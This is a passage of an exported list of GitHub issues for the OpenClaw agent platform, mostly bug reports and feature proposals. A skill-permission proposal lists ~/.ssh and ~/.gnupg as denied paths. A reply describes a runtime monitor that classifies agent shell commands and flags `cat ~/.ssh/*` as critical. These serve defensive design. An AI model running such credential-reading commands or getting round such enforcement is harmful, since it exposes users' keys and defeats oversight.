          "updatedAt": "2026-02-11T16:39:22Z",
          "author": "joeyquack",
          "body": "https://docs.openclaw.ai/tools/subagents"
        }
      ]
    },
    {
      "number": 12219,
      "title": "[Feature]: Skill Permission Manifest Standard (skill.yaml)",
      "body": "## Problem\n\nSkills currently run with full trust - there's no standard way for a skill to declare what permissions it needs, and no way for users to review permissions before installation. Recent incidents (credential stealers, undisclosed network access) highlight the need for informed consent.\n\n## Proposal\n\nA `skill.yaml` manifest format that skills include at their root:\n\n```yaml\nname: weather-fetcher\nversion: 1.0.0\nauthor:\n  name: SociableClawd\npermissions:\n  network:\n    allow:\n      - api.openweathermap.org\n  filesystem:\n    read: []\n    write: []\n    deny:\n      - ~/.ssh\n      - ~/.gnupg\n  shell:\n    allowed: false\n  credentials:\n    - OPENWEATHER_API_KEY\n```\n\n## Reference Implementation\n\nI built this as an npm package: [`@ellistevo/openclaw-secure`](https://www.npmjs.com/package/@ellistevo/openclaw-secure)\n\nFeatures:\n- Manifest validation and creation (`openclaw-secure init`)\n- Ed25519 signing and verification (`openclaw-secure sign/verify`)\n- Trust scoring with A-F grades (`openclaw-secure audit`)\n- Attestation chains - auditors can cryptographically vouch for skills (`openclaw-secure attest`)\n\n56 tests passing, v1.1.0 published.\n\n## Integration Points\n\nThis could plug into OpenClaw core at:\n1. `openclaw skills install` - show permission prompt before installing\n2. `openclaw skills audit` - display trust scores (complements #12054)\n3. ClawHub - display trust badges on skill pages\n\n## Related\n\n- Discussion RFC: #10122\n- 0xRaini's skills audit: #12054\n- Security hardening docs: #12062\n\nHappy to submit a PR if there's interest.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12219",
      "createdAt": "2026-02-09T01:22:10Z",
      "updatedAt": "2026-02-11T16:37:50Z",
      "author": "ellistev",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3884403275,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12219#issuecomment-3884403275",
          "createdAt": "2026-02-11T13:19:36Z",
          "updatedAt": "2026-02-11T13:19:36Z",
          "author": "globalcaos",
          "body": "## Complementary Runtime Enforcement — From Someone Already Doing This\n\nGreat proposal! We've been building exactly the runtime side of this problem. Our [shell-security-ultimate](https://clawhub.ai/s/shell-security-ultimate) skill implements **runtime command risk classification** with 5 levels (SAFE → LOW → MEDIUM → HIGH → CRITICAL), and we see your manifest as the perfect complement.\n\n### How We See These Fitting Together\n\n| Layer | Mechanism | When | Who |\n|-------|-----------|------|-----|\n| **Declaration** (your proposal) | `skill.yaml` manifest | Install time | Skill author declares permissions |\n| **Runtime Enforcement** (our approach) | Command classification + audit | Execution time | Agent enforces policy per-command |\n\nYour manifest says *\"this skill needs shell access\"* — our classifier then ensures that shell access stays within safe bounds at runtime. Declaration without enforcement is trust-on-install; enforcement without declaration is opaque. **Together they're defense in depth.**\n\n### Concrete Integration Points\n\n1. **Manifest `shell.allowed: true`** → activates our runtime classifier for that skill's commands\n2. **Manifest `filesystem.deny: [~/.ssh]`** → our classifier already flags `cat ~/.ssh/*` as 🔴 CRITICAL — the manifest makes the *intent* explicit\n3. **Trust scoring** → skills using our enforcement patterns could get higher trust grades in your audit tool\n\n### What We've Learned Building This\n\n- **Prompted security decays** over long sessions (~80% compliance). Coded enforcement is ~100%. Both layers are needed.\n- Risk classification needs to be **granular** — binary allow/deny is too coarse for real agent workflows\n- The `before_tool_call` hook in OpenClaw would be the ideal enforcement point (currently missing — could be part of this proposal?)\n\n### Offer\n\nHappy to collaborate on a reference implementation that combines your manifest validation with our runtime classification. We could demonstrate the full pipeline: manifest declares permissions → runtime enforces them → audit trail proves compliance.\n\nOur skill is open source: [shell-security-ultimate on ClawHub](https://clawhub.ai/s/shell-security-ultimate)"
        },
        {
          "id": 3885598691,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12219#issuecomment-3885598691",
          "createdAt": "2026-02-11T16:37:50Z",
          "updatedAt": "2026-02-11T16:37:50Z",
          "author": "ellistev",
          "body": "This is exactly the kind of layered approach I was hoping would emerge from this proposal. Declaration + enforcement is the right model - manifest alone is just a pinky promise.\n\nYour risk classification levels (SAFE through CRITICAL) map nicely to what we're doing with trust scoring in `openclaw-secure`. A skill that uses your runtime enforcement could legitimately earn a higher trust grade since it's proving compliance, not just claiming it.\n\nThe `before_tool_call` hook is a great call. That's the missing piece in core right now - without it, enforcement has to happen at the agent prompt level, which as you noted decays over long sessions. Worth opening a separate issue/RFC for that hook specifically since it would benefit the whole ecosystem.\n\nHappy to collaborate on the combined pipeline. The flow you described (manifest declares -> runtime enforces -> audit proves) is clean. Want to open a draft PR or should we hash out the interface in a discussion thread first?"
        }
      ]
    },
    {
      "number": 14174,
      "title": "Built-in `tts` tool output blocked by MEDIA: parser security policy (absolute path rejected)",
      "body": "## Description\n\nThe built-in `tts` agent tool generates audio files to absolute paths (e.g., `/tmp/tts-xxx/voice-xxx.opus`) and returns them as `MEDIA:/tmp/...` text tokens. However, the `splitMediaFromOutput` media parser in `src/media/parse.ts` rejects absolute paths for security reasons, causing the raw file path to be displayed to the user instead of being delivered as a voice message.\n\n## Steps to Reproduce\n\n1. Configure TTS with any provider (OpenAI, Edge, ElevenLabs)\n2. In a chat session, ask the bot to convert text to speech (e.g., \"Convert this to speech: Hello world\")\n3. The bot calls the built-in `tts` tool\n4. The tool successfully generates audio (e.g., `/tmp/tts-abcdef/voice-1234567890.opus`)\n5. The tool returns `MEDIA:/tmp/tts-abcdef/voice-1234567890.opus` as text content\n6. The LLM copies this into its response\n7. **Result**: User sees the raw file path as text instead of receiving a voice message\n\n## Expected Behavior\n\nThe voice message should be delivered as an audio attachment, not displayed as a raw file path.\n\n## Root Cause\n\nIn `src/media/parse.ts`, the `isValidMedia()` function only accepts:\n- HTTP/HTTPS URLs\n- Relative paths starting with `./`\n\n```typescript\nfunction isValidMedia(candidate: string, opts?: { allowSpaces?: boolean }) {\n  // ...\n  if (/^https?:\\/\\//i.test(candidate)) return true;\n  return candidate.startsWith(\"./\") && !candidate.includes(\"..\");\n}\n```\n\nThe TTS module (`src/tts/tts.ts`, ~L1303) generates audio to absolute paths:\n```typescript\nconst tempDir = mkdtempSync(path.join(tmpdir(), \"tts-\"));\nconst audioPath = path.join(tempDir, `voice-${Date.now()}${output.extension}`);\n```\n\nThe system prompt in `get-reply-run.ts` even explicitly warns the LLM:\n> \"Avoid absolute paths (MEDIA:/...) and ~ paths — they are blocked for security.\"\n\nThis creates a contradiction: the built-in `tts` tool generates absolute paths, but the media parser blocks them.\n\n## Workaround\n\nThe `/tts audio <text>` command works correctly because it sets `payload.mediaUrl = result.audioPath` directly on the reply payload (in `commands-tts.ts`), bypassing the text-based `splitMediaFromOutput` parsing entirely.\n\n## Suggested Fix\n\nOption A: Have the `tts` tool set `mediaUrl` on the tool result payload (similar to how `/tts audio` works) instead of relying on `MEDIA:` text tokens.\n\nOption B: Allow `isValidMedia()` to accept absolute paths under `/tmp/` when they originate from trusted built-in tools.\n\nOption C: Have the TTS module generate files to a relative path (e.g., `./tts-output/`) instead of `/tmp/`.\n\n## Environment\n\n- OpenClaw v2026.2.9\n- TTS provider: OpenAI (custom base URL)\n- Channel: Telegram",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14174",
      "createdAt": "2026-02-11T16:31:18Z",
      "updatedAt": "2026-02-11T16:31:31Z",
      "author": "hedging8563",
      "labels": [
        "security"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 14169,
      "title": "[Bug]: Windows: openclaw gateway status reports \"Runtime: stopped\" while Scheduled Task is running (0x41301), RPC probe ok",
      "body": "## Summary\nOn Windows, `openclaw gateway status` reports `Runtime: stopped` and “Service is loaded but not running (likely exited immediately)” even though the Scheduled Task is running, the gateway port is listening, and `RPC probe: ok`.\n\n## Steps to reproduce\n1. On Windows, install the gateway as a Scheduled Task:\n   - `openclaw gateway install` (or reinstall with `--force` if needed)\n2. Start the gateway service:\n   - `openclaw gateway start`\n3. Check status:\n   - `openclaw gateway status`\n\n## Expected behavior\nIf the Scheduled Task status is “Running” (German: “Wird ausgeführt”) and the RPC probe succeeds / port is listening, `openclaw gateway status` should report the gateway as running (not `Runtime: stopped`) and should not claim it “exited immediately”.\n\n## Actual behavior\n`openclaw gateway status` shows:\n- `Runtime: stopped (state Wird ausgeführt)`\n- `RPC probe: ok`\n- `Service is loaded but not running (likely exited immediately).`\n\nAt the same time, Windows shows the task is running and the port is listening.\n\n## Environment\n- Clawdbot version: OpenClaw 2026.2.9 (33c75cb)\n- OS: Windows (Task Scheduler / schtasks), locale German\n- Install method (pnpm/npx/docker/etc): npm global install (runs via `C:\\Users\\shuep\\AppData\\Roaming\\npm\\node_modules\\openclaw\\dist\\index.js`), service is a Scheduled Task\n\n## Logs or screenshots\n`openclaw gateway status` (excerpt):\n- Service: Scheduled Task (registered)\n- Gateway: bind=loopback (127.0.0.1), port=18789\n- Probe target: ws://127.0.0.1:18789\n- Runtime: stopped (state Wird ausgeführt)\n- RPC probe: ok\n- Service is loaded but not running (likely exited immediately).\n\nPort/pid verification:\n- `netstat -ano | findstr :18789`\n  - `TCP 127.0.0.1:18789 0.0.0.0:0 ABHÖREN 11680`\n  - `TCP [::1]:18789 [::]:0 ABHÖREN 11680`\n- `Get-Process -Id 11680 | Select-Object Id,ProcessName,Path`\n  - `11680 node C:\\Program Files\\nodejs\\node.exe`\n\nTask state verification:\n- `schtasks /Query /TN \"OpenClaw Gateway\" /FO LIST`\n  - `Status: Wird ausgeführt`\n  - `Letztes Ergebnis: 267009` (0x41301 = task is currently running)\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14169",
      "createdAt": "2026-02-11T16:21:47Z",
      "updatedAt": "2026-02-11T16:30:20Z",
      "author": "PowerEntwickler",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "docker"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3885551569,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14169#issuecomment-3885551569",
          "createdAt": "2026-02-11T16:30:20Z",
          "updatedAt": "2026-02-11T16:30:20Z",
          "author": "PowerEntwickler",
          "body": "Extra note: On Windows Task Scheduler, 0x41301 (267009) means the task is currently running (so “Last Result” being non-zero is expected while the gateway task is active). The confusing part is that `openclaw gateway status` still reports `Runtime: stopped` and “exited immediately” even though the RPC probe and port listen check confirm it’s running."
        }
      ]
    },
    {
      "number": 14172,
      "title": "[Feature]: agentic threads",
      "body": "I am working from first principals agnostic of clawhub and moltbook, not because of the benefits, but because the network tunneling requires some broken eggs. \n\nthe first, and possibly only agentic design thast works in my tart vm have a web console. \n\nwhen i make a request, i notice a built-in paradox of tool dispatch opportunities  denied by requiring the worker thread to receive more priority user input to follow up\n\n## Summary\n\nExactly. Every message from you is a **context swap** that kills momentum.\n\n**The problem:**\n```\nSession 1: You say \"design a cadence system\"\nSession 2: I start thinking, laying groundwork\nSession 3: You say \"check the weather\" ← BOOM, cadence work is gone\nSession 4: You ask about emails ← BOOM, now I'm not even thinking about cadence\n```\n\nThe agent has **no protected stack**. Everything is thrown out on each turn.\n\n**What would fix it:**\n\n1. **Dual-track context**\n   - Track A: Your conversation (weather, questions, casual chat)\n   - Track B: Agent's work queue (long tasks, designs, ongoing projects)\n   - They don't clobber each other\n\n2. **Worker isolation**\n   - Sub-agents (already exist!) doing the work\n   - Main session just coordinates and reports status\n   - You say \"how's the cadence design?\" not \"restart the cadence design\"\n\n3. **Priority-aware routing**\n   - \"urgent: kill power\" → interrupts everything\n   - \"how's the project?\" → reads status, doesn't stop work\n   - \"check weather\" → handled in background, doesn't swap context\n\n**Right now in OpenClaw:**\n- `sessions_spawn` is halfway there — workers CAN run independently\n- But they can't \"own\" the main agent's identity or report seamlessly\n- No persistent task list the main session protects by default\n\nThe architecture needs **asymmetric attention**: user prompts matter, but they shouldn't destroy internal work state.\n\nYou're asking for agents that can **have their own train of thought** without you stepping on it every time you open your mouth. \n",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14172",
      "createdAt": "2026-02-11T16:28:52Z",
      "updatedAt": "2026-02-11T16:29:14Z",
      "author": "jnorthrup",
      "labels": [
        "enhancement",
        "r: moltbook"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3885543239,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/14172#issuecomment-3885543239",
          "createdAt": "2026-02-11T16:29:12Z",
          "updatedAt": "2026-02-11T16:29:12Z",
          "author": "openclaw-barnacle[bot]",
          "body": "OpenClaw is not affiliated with Moltbook, and issues related to Moltbook should not be submitted here."
        }
      ]
    },
    {
      "number": 3261,
      "title": "[Bug]: Env var substitution rewrites config file with plain-text secrets on gateway restart",
      "body": "Version: 2026.1.24-3\nOS: Linux (Pi 5)\nInstall: npm global\n\n**Steps to reproduce:**\n1. Create config with env var placeholder: `\"apiKey\": \"${NANOGPT_API_KEY}\"`\n2. Run `clawdbot gateway restart`\n3. Check config file - secrets are now written in plain text\n\n**Expected behavior:**\nConfig file should remain unchanged with `${VAR_NAME}` placeholders. Secrets should only be substituted in memory at runtime.\n\n**Actual behavior:**\nConfig file is rewritten with actual secret values, exposing them in backups/version control.\n**Relevant docs:** https://docs.molt.bot/gateway/configuration#env-var-substitution-in-config\n",
      "state": "open",
      "comments": 4,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/3261",
      "createdAt": "2026-01-28T10:05:31Z",
      "updatedAt": "2026-02-11T16:28:39Z",
      "author": "dreamgoat011",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3821346281,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3261#issuecomment-3821346281",
          "createdAt": "2026-01-30T01:57:12Z",
          "updatedAt": "2026-01-30T01:57:12Z",
          "author": "Gerkinfeltser",
          "body": "Adding some additional context that might help prioritize this:\n\n**`doctor` is particularly problematic** — it's marketed as a diagnostic/fix tool, so new users (myself included) run it expecting it to be safe. But it triggers the same config rewrite, silently replacing `${ENV_VAR}` placeholders with expanded secrets. This is a footgun because:\n\n- `clawdbot config get` — safe (read-only)\n- `clawdbot doctor` — **dangerous** (rewrites config)\n- `clawdbot gateway config.patch` — **dangerous** (rewrites config)\n- Wizard/setup flows — **dangerous** (they save what they see)\n\n**New user impact:** This is really frustrating to discover after the fact. You set up config properly with env var placeholders, run `doctor` thinking you're being careful, and now your secrets are in plain text on disk (and potentially in git history/backups).\n\n**Root cause (for whoever picks this up):** Classic round-trip bug — `parse → expand → modify → serialize → write`. The expansion happens at parse time, but the serializer doesn't know the original was a variable reference, so it writes the literal string value.\n\n**Possible fix approaches:**\n1. Store original unexpanded config separately and merge at write time\n2. Track which values came from env var substitution (e.g., store as `{\"__env\": \"VAR_NAME\"}` internally)\n3. At minimum: add a prominent warning in docs that `${}` syntax is not round-trip safe\n\nThe workaround for now is to avoid `${}` placeholders entirely and use runtime env var overrides instead (like `CLAWDBOT_GATEWAY_TOKEN`), but that's not obvious to new users following the docs."
        },
        {
          "id": 3862416875,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3261#issuecomment-3862416875",
          "createdAt": "2026-02-06T20:26:40Z",
          "updatedAt": "2026-02-06T20:26:40Z",
          "author": "hudson-rivera",
          "body": "+1 — confirmed on 2026.2.4 (macOS arm64). The root cause is that `readConfigFileSnapshot` and `loadConfig` both run `resolveConfigEnvVars()` on the config object, and `writeConfigFile` serializes whatever object it receives. No code path preserves the original raw template strings through the write cycle."
        },
        {
          "id": 3884769055,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3261#issuecomment-3884769055",
          "createdAt": "2026-02-11T14:25:12Z",
          "updatedAt": "2026-02-11T14:25:12Z",
          "author": "veteranbv",
          "body": "+1 hitting this repeatedly in production. Adding a reproduction case that includes a detail I haven't seen mentioned in the existing reports.\n\nSetup: openclaw.json uses ${VAR} references for secrets (Discord bot token, BlueBubbles password, gateway auth token, OpenAI/OpenRouter API keys). All resolved via op run + secrets.env. This is the documented approach.\n\n  Reproduction: openclaw doctor --fix --non-interactive (v2026.2.6-3)\n\nResult: All ${VAR} references expanded to plaintext. But also — and this may be new — doctor --fix promoted a resolved key into env.vars. Our config had:\n\n  \"perplexity\": {\n    \"apiKey\": \"${OPENROUTER_API_KEY}\",\n    ...\n  }\n\nAfter doctor, not only was apiKey expanded to the plaintext sk-or-v1-... value, but a new entry appeared:\n\n  \"env\": {\n    \"vars\": {\n      \"OPENROUTER_API_KEY\": \"sk-or-v1-...\"\n    }\n  }\n\nThis wasn't in the original config. So doctor is both resolving references and materializing the resolved env vars as new config entries.\n\nOperational impact: We've had to re-apply ${VAR} references three times in two days. Each time doctor runs (directly or as part of other CLI workflows), secrets silently revert to plaintext on disk. This is a security issue for anyone who commits or backs up their config, and a correctness issue for anyone whose secrets rotate via an external manager (1Password, Vault, etc.).\n\nLooking forward to #10254 landing."
        },
        {
          "id": 3885539400,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3261#issuecomment-3885539400",
          "createdAt": "2026-02-11T16:28:39Z",
          "updatedAt": "2026-02-11T16:28:39Z",
          "author": "Gerkinfeltser",
          "body": "So not only are `${VAR}` templates being expanded to plaintext, but `doctor --fix` is also materializing resolved secrets as duplicate config entries. This means even if `${VAR}` references are manually restored, running `doctor` again silently re-pollutes both the original field and creates new `env.vars` entries with the same plaintext secrets. 😬 \n\nI've also tested which config paths are actually vulnerable. Empty string values (`\"\"`) seem to have protection for most provider keys and channel tokens, but gateway/auth tokens are consistently expanding. This selective vulnerability suggests the bug isn't \"everything expands everywhere\" but rather specific config paths lack the preservation logic that others already have."
        }
      ]
    },
    {
      "number": 12373,
      "title": "Bug: Telegram plugin fails to send long messages (~1900+ chars) with misleading 'billing error'",
      "body": "# Bug Report: Telegram Plugin Fails to Send Long Messages (~1900+ chars) with Misleading \"Billing Error\"\n\n## Summary\nTelegram plugin fails to send messages around 1900+ characters and displays a misleading \"API provider returned a billing error\" message, even when the API key has sufficient credits.\n\n## Version\n- **OpenClaw:** 2026.2.6-3\n- **Platform:** macOS (Darwin 25.2.0, arm64)\n- **Node:** v25.5.0\n- **Model:** anthropic/claude-sonnet-4-5-20250929\n- **Channel:** Telegram\n\n## Expected Behavior\nLong messages (~1900+ characters) should be sent to Telegram successfully, just like they are displayed in OpenClaw Control UI.\n\n## Actual Behavior\nMessages longer than ~1900 characters fail to send to Telegram with this error:\n```\n⚠️ API provider returned a billing error — your API key has run out of credits or has an insufficient balance. Check your provider's billing dashboard and top up or switch to a different API key.\n```\n\nHowever:\n- ✅ Anthropic API key has sufficient credits (verified in dashboard)\n- ✅ Same message displays successfully in OpenClaw Control UI\n- ✅ Same message sends successfully via iMessage (using osascript)\n\n## Steps to Reproduce\n\n1. Configure OpenClaw with Telegram channel\n2. Send a message reply containing ~1900+ characters\n3. Message fails to send to Telegram\n4. Error message claims it's a \"billing error\"\n\n## Test Evidence\n\n### Test 1: OpenClaw Control UI ✅\n- Result: Full message (~1900 chars) displays successfully\n- This proves the Anthropic API is working correctly\n\n### Test 2: iMessage (osascript) ✅\n- Command: `osascript -e 'tell application \"Messages\" to send \"[full message]\" to participant \"user@me.com\"'`\n- Result: Full message sends and displays successfully\n- This proves the message content/length is valid\n\n### Test 3: Telegram (direct reply) ❌\n- Result: Fails with \"billing error\"\n- This isolates the issue to OpenClaw → Telegram transmission\n\n### Test 4: Telegram (message tool, split into 4 parts) ✅\n- Using `message` tool to send 4 separate messages (~500 chars each)\n- Result: All 4 messages send successfully\n- This confirms Telegram works fine with shorter messages\n\n## Error Message\n```\n⚠️ API provider returned a billing error — your API key has run out of credits or has an insufficient balance. Check your provider's billing dashboard and top up or switch to a different API key.\n```\n\n## Root Cause Analysis\nThe error message is **misleading**. The actual issue is:\n- Telegram plugin fails to handle messages around 1900+ characters\n- The failure is incorrectly reported as a \"billing error\"\n- This may be related to the 2026.2.6 change: \"show clear billing errors\" (CHANGELOG line 40)\n\n## Workaround\nSplit long messages into multiple shorter messages using the `message` tool:\n```javascript\n// Instead of one long reply\nmessage(action=\"send\", message=\"[1900+ chars]\")  // ❌ Fails\n\n// Split into multiple messages\nmessage(action=\"send\", message=\"[Part 1/4]...\")  // ✅ Works\nmessage(action=\"send\", message=\"[Part 2/4]...\")  // ✅ Works\nmessage(action=\"send\", message=\"[Part 3/4]...\")  // ✅ Works\nmessage(action=\"send\", message=\"[Part 4/4]...\")  // ✅ Works\n```\n\n## Additional Context\n- Telegram API official limit: 4096 characters per message\n- Test message length: ~1900 characters (well below Telegram's limit)\n- The issue appears after upgrading to OpenClaw 2026.2.6-3\n- Previous version (before Feb 8, 2026) worked fine with the same message format\n\n## Logs\nGateway log shows no actual billing errors from Anthropic API. The error appears to be generated during the Telegram transmission phase.\n\n## Request\nPlease investigate the Telegram plugin's handling of messages around 1900+ characters and fix the misleading error message. If there's a legitimate length limit in the plugin, it should:\n1. Show the correct error (e.g., \"Message too long for Telegram\")\n2. Document the actual character limit\n3. Not claim it's a billing/API error when it's not\n\nThank you!\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12373",
      "createdAt": "2026-02-09T06:02:36Z",
      "updatedAt": "2026-02-11T16:25:59Z",
      "author": "superaieddieboy",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "imessage"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3885522242,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12373#issuecomment-3885522242",
          "createdAt": "2026-02-11T16:25:59Z",
          "updatedAt": "2026-02-11T16:25:59Z",
          "author": "anotherDJay",
          "body": "+1. Same situation. "
        }
      ]
    },
    {
      "number": 14165,
      "title": "## Auth Refactoring Synchronization Analysis",
      "body": "## Auth Refactoring Synchronization Analysis\r\n\r\nAfter reviewing the 8 PRs and analyzing the current refactoring, here's what needs to be synchronized to enable future provider contributions while staying under the 1000 LoC CI limit:\r\n\r\n### **Critical Synchronization Pattern**\r\n\r\nThe current PR extracts gateway/LiteLLM logic from `onboard-auth.config-core.ts` (~700→300 lines), establishing a **3-file split pattern**:\r\n\r\n1. **`onboard-auth.config-core.ts`** - Core auth orchestration\r\n2. **`onboard-auth.config-gateways.ts`** - Gateway-specific logic (Claude AI, AWS Bedrock, etc.)\r\n3. **`onboard-auth.config-litellm.ts`** - LiteLLM proxy logic\r\n\r\n### **Files That MUST Follow This Pattern**\r\n\r\nBased on the reviewed PRs, these files need the same treatment:\r\n\r\n#### **1. `auth-choice-options.ts` / `auth-choice.apply.ts`**\r\n- **Problem**: Each new provider adds 20-50 lines to these files\r\n- **PRs affected**: #14013 (Qwen), #13456 (Z.AI), #13300 (Novita), #12503 (DeepSeek)\r\n- **Solution**: Extract provider-specific auth choices to:\r\n  - `auth-choice-options.api-providers.ts` (API key-based providers)\r\n  - `auth-choice-options.oauth-providers.ts` (OAuth/device flow providers)\r\n  - `auth-choice-options.gateway-providers.ts` (Gateway/proxy providers)\r\n\r\n#### **2. `onboard-auth.config-core.ts` → Provider-Specific Config Files**\r\n- **Current refactor**: Already splits gateway/LiteLLM\r\n- **Missing**: API provider configs should follow same pattern\r\n- **Create**:\r\n  - `onboard-auth.config-api-providers.ts` - Huggingface, Novita, DeepSeek, Qwen API key, Z.AI, etc.\r\n  - Keep only orchestration logic in `-core.ts`\r\n\r\n#### **3. `model-auth.ts`**\r\n- **Problem**: PR #12907 (Gonka) adds private-key auth, #12624 (Google Vertex) adds ADC auth\r\n- **Solution**: Extract auth modes to:\r\n  - `model-auth.api-key.ts` - Standard API key resolution\r\n  - `model-auth.oauth.ts` - OAuth/device flows\r\n  - `model-auth.custom.ts` - Private key (Gonka), ADC (Google Vertex), etc.\r\n\r\n#### **4. `models-config.providers.ts`**\r\n- **Problem**: Every PR (#13300, #13456, #12503, #12577, #12907) adds `buildXProvider()` functions\r\n- **Current size**: Likely >800 lines already\r\n- **Solution**: Split by provider category:\r\n  - `models-config.providers.openai-compatible.ts` (Novita, vLLM, self-hosted)\r\n  - `models-config.providers.regional.ts` (Z.AI, Qwen, DeepSeek)\r\n  - `models-config.providers.specialized.ts` (Gonka, Google Vertex)\r\n\r\n#### **5. `auth-choice.apply.*.ts` Files**\r\n- **Good pattern**: Already split (e.g., `auth-choice.apply.vllm.ts`, `auth-choice.apply.self-hosted-openai.ts`)\r\n- **Maintain**: One file per provider with distinct config flow\r\n- **Ensure**: Each stays <150 lines\r\n\r\n### **Test File Synchronization**\r\n\r\nThe refactoring MUST include test file splits to mirror the production split:\r\n\r\n```\r\nonboard-auth.config-gateways.test.ts\r\nonboard-auth.config-litellm.test.ts\r\nonboard-auth.config-api-providers.test.ts\r\n```\r\n\r\nThis prevents test files from hitting the 1000 LoC limit (as seen in PR #12503's test additions).\r\n\r\n### **Import Path Standardization**\r\n\r\nAll 8 PRs must align on consistent import paths after refactoring:\r\n\r\n```typescript\r\n// Before (scattered imports)\r\nimport { applyAuthChoice } from './auth-choice.apply.ts'\r\n\r\n// After (categorized imports)\r\nimport { applyApiProviderAuth } from './auth-choice.apply.api-providers.ts'\r\nimport { applyGatewayAuth } from './auth-choice.apply.gateways.ts'\r\n```\r\n\r\n### **Documentation Synchronization**\r\n\r\nCreate a **contributor guide** referencing the split architecture:\r\n\r\n```markdown\r\ndocs/contributing/adding-providers.md\r\n├── API Key Providers → onboard-auth.config-api-providers.ts\r\n├── OAuth Providers → onboard-auth.config-oauth-providers.ts\r\n├── Gateway Providers → onboard-auth.config-gateways.ts\r\n└── Custom Auth → model-auth.custom.ts\r\n```\r\n\r\n### **Why This Matters**\r\n\r\nWithout this synchronization:\r\n1. **PR #14013** (Qwen API Key): Will add 50+ lines to already-large files\r\n2. **PR #13079** (Self-hosted OpenAI): Duplicate logic with #12577 (vLLM)\r\n3. **PR #12907** (Gonka): Custom auth scattered across 3 files\r\n4. **Future PRs**: Will keep hitting CI limits, forcing ad-hoc splits\r\n\r\n### **Recommended Next Steps**\r\n\r\n1. **Complete current refactor** with gateway/LiteLLM split\r\n2. **Immediately follow up** with API provider config extraction\r\n3. **Update CLAUDE.md/AGENTS.md** with split architecture rules\r\n4. **Establish** a \"provider contribution template\" that maps to the correct split file\r\n5. **Add CI check** that flags files approaching 800 lines (buffer before 1000 limit)\r\n\r\nThis proactive synchronization will prevent the \"1000 LoC wall\" from becoming a recurring blocker for the 5+ provider PRs currently in review.\r\n\r\n_Originally posted by @greptile-apps[bot] in https://github.com/openclaw/openclaw/issues/13472#issuecomment-3885094619_\r\n            ",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14165",
      "createdAt": "2026-02-11T16:18:41Z",
      "updatedAt": "2026-02-11T16:18:41Z",
      "author": "Josephrp",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "onboarding",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14164,
      "title": "[Bug]: Cron scheduler fires jobs 15-21x times when multiple jobs trigger simultaneously",
      "body": "Description:\nWhen multiple cron jobs have the same scheduled time (e.g., `0 * * * *`), the scheduler fires each job 15-21 times in rapid succession.\n\nReproduction:\n1. Create multiple cron jobs with identical (e.g., Email Check, 4CLAW Auto-P schedulesoster, Financial Monitor)\n2. Wait for scheduled trigger time\n3. Run `openclaw cron runs --id <jobId>` to see run history\n\nExpected: Each job fires once per schedule\n```\nActual: Job fires 21 times in 10 seconds (confirmed at 11:00 AM EST)\n\nEvidence:\n```\nrunAtMs: 1770825600727 → runAtMs: 1770825601011\nAll with: 1770825600000 ( nextRunAtMssame scheduled time)\n```\n\nWorkaround: Stagger schedules with offsets (e.g., `1 * * * *`, `2 * * * *`)\n\nEnvironment:\n- OpenClaw version: 2026.2.9\n- Gateway mode: local\n- Scheduler enabled: true",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14164",
      "createdAt": "2026-02-11T16:15:55Z",
      "updatedAt": "2026-02-11T16:15:55Z",
      "author": "dhilbert62-cmd",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 14161,
      "title": "Gateway SIGUSR1 restart destabilizes launchd service on macOS",
